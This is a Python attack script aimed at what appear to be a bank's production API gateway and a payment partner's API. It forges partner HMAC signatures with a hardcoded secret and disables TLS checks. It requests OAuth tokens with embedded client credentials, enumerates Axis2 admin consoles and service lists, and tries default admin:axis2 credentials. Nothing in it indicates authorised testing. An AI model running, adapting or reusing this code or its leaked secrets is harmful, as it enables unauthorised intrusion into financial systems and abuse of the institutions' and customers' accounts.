#!/usr/bin/env python3
import hmac, hashlib, json, datetime, urllib.request, ssl

SECRET = "XO8V9VcN08JpAw9QXBpYUlQFmxILm4Cb"
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE

def forge(method, path, body=""):
    now = datetime.datetime.now(datetime.timezone.utc)
    ts = now.strftime('%Y-%m-%dT%H:%M:%S.') + f"{now.microsecond//1000:03d}" + 'Z'
    body_str = "" if body == "" else json.dumps(body)
    h = hashlib.sha256(body_str.encode()).hexdigest()
    msg = f"{method}:{path}:{h}:{ts}"
    sig = hmac.new(SECRET.encode(), msg.encode(), hashlib.sha256).hexdigest()
    return {"X-SIGNATURE": sig, "X-TIMESTAMP": ts, "X-PLATFORM": "WEBVIEW", "X-PARTNER-ID": "payuung"}

def req(method, url, headers):
    r = urllib.request.Request(url, method=method, headers=headers)
    try:
        resp = urllib.request.urlopen(r, timeout=20, context=ctx)
        return resp.status, resp.read()[:400].decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:400].decode('utf-8', 'ignore')
    except Exception as e:
        return "ERR", str(e)[:120]

print("== EGRESS IP ==")
try:
    print(urllib.request.urlopen("https://api.ipify.org", timeout=10, context=ctx).read().decode())
except Exception as e:
    print("ipify err", e)

targets = [
    ("https://apigw-prod.bankina.id/exp-api-cicilan/1.0/", "/exp-api-cicilan/1.0/"),
    ("https://apigw-prod.bankina.id/exp-api-cicilan/1.0/cicilan/dashboard", "/exp-api-cicilan/1.0/cicilan/dashboard"),
    ("https://apigw-prod.bankina.id/exp-api-portal-loan/1.0/loan/partner/config", "/exp-api-portal-loan/1.0/loan/partner/config"),
    ("https://apigw-prod.bankina.id/exp-api-portal-loan/1.0/", "/exp-api-portal-loan/1.0/"),
]
for url, path in targets:
    s, b = req("GET", url, {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)", **forge("GET", path)})
    print(f"{s} {path} => {b[:200]}")

print("== PAYUUNG API RETEST (client_credentials) ==")
try:
    data = json.dumps({"client_id":"jgHY8WqE1gZwqEifL9axo9Zo4cik9PDT9DyQy80JdZQ=","client_secret":"ySjvffjjAPkB6EvKv6BTZ7Pwq2sV/R8h/V9HD4MFE4M=","grant_type":"client_credentials"}).encode()
    r = urllib.request.Request("https://api.payuung.com/v2/oauth2/token", data=data, headers={"Content-Type":"application/json"}, method="POST")
    resp = urllib.request.urlopen(r, timeout=20, context=ctx)
    print("payuung token:", resp.status, resp.read()[:150].decode())
except urllib.error.HTTPError as e:
    print("payuung token:", e.code, e.read()[:150].decode())
except Exception as e:
    print("payuung token ERR:", str(e)[:100])



print("== V8: AXIS2 ADMIN + SERVICE LIST ==")
import base64 as b64mod
# service list penuh
s, b = req("GET", "https://apigw-prod.bankina.id/services/listServices", {"User-Agent": "Mozilla/5.0"})
print("listServices:", s, b[:1500])
# admin console
for p in ["/axis2-admin/", "/axis2-admin/login", "/axis2-admin/listServices", "/axis2-web/"]:
    s, b = req("GET", "https://apigw-prod.bankina.id" + p, {"User-Agent": "Mozilla/5.0"})
    print("ADMIN " + p + " => " + str(s) + " " + b[:100])
# default creds admin:axis2 (Basic auth)
auth = "Basic " + b64mod.b64encode(b"admin:axis2").decode()
for p in ["/axis2-admin/", "/axis2-admin/listServices", "/services/listServices"]:
    s, b = req("GET", "https://apigw-prod.bankina.id" + p, {"User-Agent": "Mozilla/5.0", "Authorization": auth})
    print("AUTH " + p + " => " + str(s) + " " + b[:150])
# services di api.bankina.id (synapse)
s, b = req("GET", "https://api.bankina.id/services/listServices", {"User-Agent": "Mozilla/5.0"})
print("api.bankina.id listServices:", s, b[:600])
